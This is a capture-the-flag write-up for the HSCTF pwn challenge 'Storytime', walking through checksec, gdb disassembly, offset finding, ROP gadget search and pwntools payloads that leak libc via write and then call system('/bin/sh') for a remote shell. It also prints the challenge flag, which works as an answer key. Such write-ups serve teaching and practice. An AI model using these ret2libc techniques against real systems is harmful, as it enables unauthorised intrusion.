## Problem info
<table>
  <tr>
    <td><strong>Name</strong></td>
    <td>Storytime</td>
  </tr>
  <tr>
    <td><strong>Category</strong></td>
    <td>Pwn</td>
  </tr>
  <tr>
    <td><strong>Flags</strong></td>
    <td>hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}</td>
  </tr>
  <tr>
    <td><strong>Files</strong></td>
    <td>storytime</td>
  </tr>
  <tr>
    <td><strong>Tags</strong></td>
    <td></td>
  </tr>
  <tr>
    <td><strong>Hints</strong></td>
    <td></td>
  </tr>
</table>

#### Message
Written by: Tux

I want a story!!!

`nc pwn.hsctf.com 3333`

## Solution
First checksec and see functions.
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
```
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
0x00000000004004a0  write@plt
0x00000000004004b0  read@plt
...
0x00000000004005b7  beginning
0x00000000004005d4  middle
0x00000000004005f1  end
0x000000000040060e  climax
0x000000000040062e  main
...
```

Seems to be a read-write-leaking lib base challenge. Let's take a look into the functions. We see `write` in end and `read` main.
```
gdb-peda$ disas end
...
   0x0000000000400606 <+21>:    call   0x4004a0 <write@plt>
   0x000000000040060b <+26>:    nop
   0x000000000040060c <+27>:    pop    rbp
End of assembler dump.
```

Then let's find the buffer overflow offsets.

```
gdb-peda$ disas main
Dump of assembler code for function main:
...
   0x0000000000400691 <+99>:    call   0x4004b0 <read@plt>
   0x0000000000400696 <+104>:   mov    eax,0x0
   0x000000000040069b <+109>:   leave
...
End of assembler dump.

gdb-peda$ b* 0x000000000040069b
Breakpoint 1 at 0x40069b

gdb-peda$r
>AAAAAAAA

[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeddd0 ("AAAAAAAA\n")
0008| 0x7ffffffeddd8 --> 0xa ('\n')
0016| 0x7ffffffedde0 --> 0x4006a0 --> 0x41d7894956415741
0024| 0x7ffffffedde8 --> 0x4004d0 --> 0x89485ed18949ed31
0032| 0x7ffffffeddf0 --> 0x7ffffffedee0 --> 0x1
0040| 0x7ffffffeddf8 --> 0x0
0048| 0x7ffffffede00 --> 0x4006a0 --> 0x41d7894956415741
0056| 0x7ffffffede08 --> 0x7fffff021b97 (<__libc_start_main+231>:       mov    edi,eax)
```

Therefore overflow offset = 0xe08 - 0xdd0 = 0x38

Second, we need got, so let's leave gdb-peda
```
$ objdump -R storytime| grep read
0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
```
now we got read@got = 0x601020

Next we need pop rdi and pop rsi.
```
$ ROPgadget --binary ./storytime | grep 'pop rdi'
0x0000000000400703 : pop rdi ; ret
$ ROPgadget --binary ./storytime | grep 'pop rsi'
0x0000000000400701 : pop rsi ; pop r15 ; ret
```

notice there is a `pop r15` in pop_rsi, remember to deal with that.
along with the given `write` position in end and going to pwn main
```
write = 0x0000000000400606
main = 0x000000000040062e
```

now the information to the binary is enough, let's construct the payload!

First step, leak the libc base ( real address) .
overload -> calling write to write **read_got** -> back to main in order pwning
```
payload = 'a' * buf
payload += flat([pop_rsi,read_got])
payload += flat([0x15])
payload += flat(write)
payload += flat([0xdeadbeef])
payload += flat(main) #jump back main for further pwning
```

let's save the actual address of **read** to rcv
```
r.recvuntil("Tell me a story: \n")
rcv  = u64(r.recv(8))
```

now all we need is the distance of read and system, /bin/sh in libc to get the shell. Here using online [libc position library](https://libc.blukat.me/?q=__libc_start_main%3A0x7ff40347d740&l=libc6_2.23-0ubuntu10_amd64)

so we now we can construct our pwning payload
```
rop = 'a' * buf
rop += flat([pop_rdi,bin_sh,sys])
```

Enjoy the shell!

```
$ python payload.py
[+] Opening connection to pwn.hsctf.com on port 3333: Done
0x7f6a5fb68250
======
[*] Switching to interactive mode
...

Tell me a story:
$ ls
bin
dev
flag
lib
lib32
lib64
storytime
$cat flag
hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}
```
